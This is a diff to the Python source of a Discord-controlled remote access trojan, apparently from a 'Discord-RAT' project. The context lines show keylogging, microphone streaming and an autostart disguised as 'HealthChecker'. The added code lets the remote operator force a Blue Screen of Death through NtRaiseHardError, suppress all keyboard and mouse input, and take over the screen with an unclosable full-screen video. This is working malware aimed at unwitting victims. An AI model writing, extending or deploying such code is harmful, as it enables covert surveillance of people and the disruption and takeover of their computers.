@@ -37,10 +37,14 @@ import pyttsx3
 import pyaudio
 import base64
 from pynput.keyboard import Key, Listener
+from pynput import keyboard, mouse
 from PIL import ImageGrab
 import threading
 import requests
 import json
+import vlc
+import tkinter as tk
+from tkinter import messagebox
 
 admin_status_file = "admin_status.txt"  # Füge diese Zeile hinzu, um die Variable zu definieren
 
@@ -61,6 +65,10 @@ AUTOSTART_NAME = "HealthChecker"
 
 # Erhalte das temporäre Verzeichnis des Systems
 temp_dir = tempfile.gettempdir()
+
+# URL des Rickroll-Videos
+VIDEO_URL = 'https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/RickRoll.mp4'
+VIDEO_PATH = os.path.join(temp_dir, 'rickroll.mp4')
 
 def is_authorized(ctx):
     return ctx.author.id in AUTHORIZED_USERS
@@ -223,6 +231,9 @@ async def custom_help(ctx):
     `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
     `!mic_stream_stop` - Stops the mic stream if activated.
     `!keylog <on/off>` - Activates or deactivates keylogging.
+    `!bsod` - triggers a Blue Screen of Death
+    `!rickroll` - ~you guessed it. It plays an Rickroll that is inescapable till the End.
+    `!input <block/unblock>` - completely blocks or unblocks the User Input, Mouse and Keyboard.
     """
     await ctx.send(help_text)
     
@@ -892,6 +903,173 @@ async def mic_stream_stop(ctx):
 
     await ctx.voice_client.disconnect()
     await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)
+    
+# Function to block closing the window
+def on_closing():
+    messagebox.showinfo("Nope", "You can't close this window! 😏")
+
+# Function to download the video
+def download_video(url, path):
+    response = requests.get(url, stream=True)
+    total_size = int(response.headers.get('content-length', 0))
+    with open(path, 'wb') as file:
+        for chunk in response.iter_content(chunk_size=1024):
+            if chunk:
+                file.write(chunk)
+
+# Function to play the video
+def play_video():
+    # Create the main window
+    window = tk.Tk()
+    window.title("Rickroll")
+    window.attributes("-fullscreen", True)  # Fullscreen mode
+    window.attributes("-topmost", True)     # Always on top
+    window.overrideredirect(True)  # Remove title bar
+    window.protocol("WM_DELETE_WINDOW", on_closing)  # Block closing
+
+    # Frame for the VLC player
+    frame = tk.Frame(window, bg='black')
+    frame.pack(fill=tk.BOTH, expand=1)
+
+    # Initialize VLC player
+    instance = vlc.Instance()
+    player = instance.media_player_new()
+    media = instance.media_new(VIDEO_PATH)
+    player.set_media(media)
+
+    # Embed VLC player in the Tkinter frame
+    player.set_hwnd(frame.winfo_id())
+
+    def check_video_end():
+        state = player.get_state()
+        if state == vlc.State.Ended:
+            close_window()
+        else:
+            window.after(1000, check_video_end)
+
+    def close_window():
+        player.stop()
+        window.destroy()
+        try:
+            os.remove(VIDEO_PATH)
+        except PermissionError:
+            print("Unable to delete the video file, it might still be in use.")
+
+    # Play the video when the window opens
+    window.after(1000, player.play)
+    window.after(1000, check_video_end)
+    window.mainloop()
+
+# Discord bot command to play the Rickroll video
+@bot.command(name='rickroll')
+async def rickroll(ctx):
+    working_message = await ctx.send("🎥 Preparing Rickroll...")
+
+    def run_video():
+        if not os.path.exists(VIDEO_PATH):
+            download_video(VIDEO_URL, VIDEO_PATH)
+        play_video()
+
+    # Start the video in a new thread
+    threading.Thread(target=run_video).start()
+
+    await working_message.delete()
+    await ctx.send("Rickroll is now playing! 🎶")
+
+# Error handling
+@rickroll.error
+async def rickroll_error(ctx, error):
+    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)
+    
+confirmation_pending = {}
+
+@bot.command(name='bsod')
+@commands.check(is_authorized)
+async def bsod(ctx):
+    confirmation_pending[ctx.author.id] = True
+    await ctx.send("⚠️ Warning: You are about to trigger a Bluescreen! Type `!confirm_bsod` within 15 seconds to confirm.")
+    
+    # Schedule the removal of the confirmation after 30 seconds
+    await asyncio.sleep(15)
+    if confirmation_pending.get(ctx.author.id):
+        confirmation_pending.pop(ctx.author.id, None)
+        await ctx.send("⏰ Confirmation timeout. Use `!bsod` to start the process again.")
+
+@bot.command(name='confirm_bsod')
+@commands.check(is_authorized)
+async def confirm_bsod(ctx):
+    if confirmation_pending.get(ctx.author.id):
+        await ctx.send("Triggering Bluescreen now... 💀")
+        # Trigger the Bluescreen
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+    else:
+        await ctx.send("No pending Bluescreen confirmation. Use `!bsod` to start the process.")
+    
+    # Clear the pending confirmation
+    confirmation_pending.pop(ctx.author.id, None)
+
+# Error handling
+@bsod.error
+async def bsod_error(ctx, error):
+    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)
+
+@confirm_bsod.error
+async def confirm_bsod_error(ctx, error):
+    await ctx.send(f"⚠️ An error occurred: {error}", delete_after=10)
+
+input_blocked = False
+keyboard_listener = None
+mouse_listener = None
+
+# Function to block user input
+def block_input():
+    global input_blocked, keyboard_listener, mouse_listener
+    if not input_blocked:
+        input_blocked = True
+        keyboard_listener = keyboard.Listener(suppress=True)
+        mouse_listener = mouse.Listener(suppress=True)
+        keyboard_listener.start()
+        mouse_listener.start()
+        print("Input blocked.")
+
+# Function to unblock user input
+def unblock_input():
+    global input_blocked, keyboard_listener, mouse_listener
+    if input_blocked:
+        input_blocked = False
+        keyboard_listener.stop()
+        mouse_listener.stop()
+        print("Input unblocked.")
+
+# Command to block or unblock input
+@bot.command(name='input')
+@commands.check(is_authorized)
+async def input_command(ctx, action: str):
+    global input_blocked
+    if action == 'block':
+        if input_blocked:
+            msg = await ctx.send("❌ Input is already blocked.")
+            await msg.delete(delay=5)
+        else:
+            block_input()
+            await ctx.send("🔒 Input has been blocked.\nTo unblock, use `!input unblock`. The only way to bypass this is to press `Ctrl + Alt + Delete`.")
+    elif action == 'unblock':
+        if not input_blocked:
+            msg = await ctx.send("❌ Input is already unblocked.")
+            await msg.delete(delay=5)
+        else:
+            unblock_input()
+            await ctx.send("🔓 Input has been unblocked.")
+    else:
+        msg = await ctx.send("❌ Invalid action. Use `!input block` or `!input unblock`.")
+        await msg.delete(delay=5)
+
+# Error handling
+@input_command.error
+async def input_command_error(ctx, error):
+    msg = await ctx.send(f"⚠️ An error occurred: {error}")
+    await msg.delete(delay=5)
 
 def main():
     time.sleep(15)
